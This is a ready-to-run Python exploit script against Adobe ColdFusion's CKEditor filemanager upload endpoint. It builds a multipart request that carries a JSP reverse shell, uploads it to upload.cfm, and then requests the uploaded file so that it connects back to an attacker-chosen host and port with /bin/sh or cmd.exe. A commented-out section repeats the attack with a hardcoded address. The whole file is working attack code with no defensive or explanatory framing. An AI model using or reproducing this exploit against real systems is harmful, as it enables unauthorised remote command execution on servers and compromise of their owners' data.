#!/usr/bin/env python3

import requests
import argparse
import sys

def build_payload(LHOST, LPORT, filename):
    print("Building payload...")

    payload = """--_Part_25_194601510_2784918519\n"""
    payload += f'Content-Disposition: form-data; name="file"; filename="{filename}"\n'
    payload += """Content-Type: application/octet-stream

<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream cw;
    OutputStream wb;

    StreamConnector( InputStream cw, OutputStream wb )
    {
      this.cw = cw;
      this.wb = wb;
    }

    public void run()
    {
      BufferedReader fi  = null;
      BufferedWriter tkq = null;
      try
      {
        fi  = new BufferedReader( new InputStreamReader( this.cw ) );
        tkq = new BufferedWriter( new OutputStreamWriter( this.wb ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = fi.read( buffer, 0, buffer.length ) ) > 0 )
        {
          tkq.write( buffer, 0, length );
          tkq.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( fi != null )
          fi.close();
        if( tkq != null )
          tkq.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}
"""
    payload += f'Socket socket = new Socket( "{LHOST}", {LPORT} );'
    payload += """Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>

--_Part_25_194601510_2784918519
Content-Disposition: form-data; name="path"
Content-Type: text/plain

path
--_Part_25_194601510_2784918519--"""

    return payload

def upload_shell(url, payload, filename):
    print("Uploading shell...")

    target = f"{url}/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm"
    headers = {
    "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
    "Content-Type": "multipart/form-data; boundary=_Part_25_194601510_2784918519",
    "Content-Length": "1842",
    "Connection": "close"
    }

    r = requests.post(target, headers=headers, data=payload)

    if not r.ok:
        print("Shell upload failed! Exiting...")
        sys.exit(1)
    else:
        print(f"Shell uploaded to {url}/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/{filename}")

def trigger_shell(url, filename):
    print("Triggering shell...")

    target = f"{url}/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/{filename}"

    r = requests.get(target)

    if r.ok:
        print("Success! Check your listener.")
    else:
        print("Failed to trigger shell. Exiting...")
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", dest="url", help="URL of the webroot, e.g. http://10.10.10.10:8500", required=True)    
    parser.add_argument("-l", dest="lhost", help="Local IP to listen on", required=True)
    parser.add_argument("-p", dest="lport", help="Local port to listen on", required=True)
    parser.add_argument("-f", dest="filename", default="shell.jsp", help="Filename of the shell, default is shell.jsp")
    args = parser.parse_args()

    URL = args.url
    LHOST = args.lhost
    LPORT = args.lport
    FILENAME = args.filename

    payload = build_payload(LHOST, LPORT, FILENAME)
    upload_shell(URL, payload, FILENAME)
    trigger_shell(URL, FILENAME)

    #query = "/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm"
#
    #target = host + query
    #headers = {
    #"User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
    #"Content-Type": "multipart/form-data; boundary=_Part_25_194601510_2784918519",
    #"Content-Length": "1842",
    #"Connection": "close"
    #}
    #data = build_payload("10.10.0.25", 443)
#
    #print("Uploading shell...")
    #pr = requests.post(target, headers=headers, data=data)
    #print("Triggering shell...")
    #gr = requests.get(host + "/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/test.jsp")

if __name__ == "__main__":
    main()